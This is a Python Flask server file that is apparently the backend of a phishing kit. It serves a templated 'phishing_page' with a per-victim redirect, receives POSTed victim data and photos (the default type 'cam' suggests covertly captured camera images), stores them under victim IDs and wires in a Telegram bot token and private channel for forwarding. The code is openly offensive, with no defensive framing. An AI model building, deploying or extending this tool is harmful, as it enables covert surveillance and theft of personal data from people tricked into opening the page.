from flask import Flask, request, jsonify
import requests
import os
import base64
import time
from config import BOT_TOKEN, PRIVATE_CHANNEL_ID

app = Flask(__name__)

# In-memory storage
victim_data = {}
user_redirects = {}
user_photos = {}  # Store photo for each victim

@app.route('/p/<uid>')
def phishing_page(uid):
    target_type = request.args.get('type', 'cam')
    victim_id = request.args.get('v', 'unknown')
    redirect_url = user_redirects.get(victim_id, 'https://google.com')
    
    with open('web/index.html', 'r') as f:
        html = f.read()
    
    html = html.replace('{{REDIRECT_URL}}', redirect_url)
    html = html.replace('{{VICTIM_ID}}', victim_id)
    html = html.replace('{{TYPE}}', target_type)
    return html

@app.route('/get_photo/<victim_id>')
def get_photo(victim_id):
    photo = user_photos.get(victim_id)
    if photo:
        return jsonify({"photo": photo})
    return jsonify({"photo": None}), 404

@app.route('/api/capture', methods=['POST'])
def capture():
    data = request.json
    if not data:
        return jsonify({"status": "error"}), 400
    
    victim_id = data.get('victim_id')
    if not victim_id:
        return jsonify({"status": "error"}), 400
    
    # Store photo if present
    if data.get('photo'):
        user_photos[victim_id] = data['photo']
    
    victim_data[victim_id] = data
    victim_data[victim_id]["time"] = time.time()
    
    # Forward to bot (which forwards to user + channel)
    forward_to_bot(data)
    return jsonify({"status": "ok"})

def forward_to_bot(data):
    try:
        # Send to bot via webhook or just store
        # Bot will pick up from victim_data
        pass
    except Exception as e:
        print(f"Forward error: {e}")

# Auto-delete old data after 10 min
import threading
def clean_old_data():
    while True:
        time.sleep(600)
        current_time = time.time()
        to_delete = []
        for key, val in victim_data.items():
            if current_time - val.get("time", 0) > 600:
                to_delete.append(key)
        for key in to_delete:
            del victim_data[key]
            if key in user_photos:
                del user_photos[key]
        print(f"🧹 Deleted {len(to_delete)} old victim data")

threading.Thread(target=clean_old_data, daemon=True).start()

if __name__ == "__main__":
    app.run(host='0.0.0.0', port=5000, debug=False)
